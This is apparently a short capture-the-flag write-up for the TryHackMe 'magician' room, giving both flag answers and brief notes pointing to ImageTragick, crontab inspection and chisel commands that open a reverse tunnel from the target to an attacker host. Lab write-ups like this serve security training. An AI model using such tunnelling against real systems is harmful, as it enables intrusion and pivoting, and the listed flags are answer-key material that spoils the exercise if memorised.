# TryHackMe magician

> Saikat Karmakar | Mar 8:2021

-------------------------------------------------------------------------------

# Task 1 
1. user.txt
```
THM{simsalabim_hex_hex}
```
2. root.txt
```
THM{magic_may_make_many_men_mad}
```

--
-----------
***Notes***
-----------
link in ftp server = https://imagetragick.com/

cat /etc/crontab
crontab -l
read the hint 
use chisel

create a server with reverse tunnelling
```
/opt/chisel server --reverse --port 4444
```
on the target box
```
./chisel client 10.4.23.120:4444 R:4444:127.0.0.1:6666
```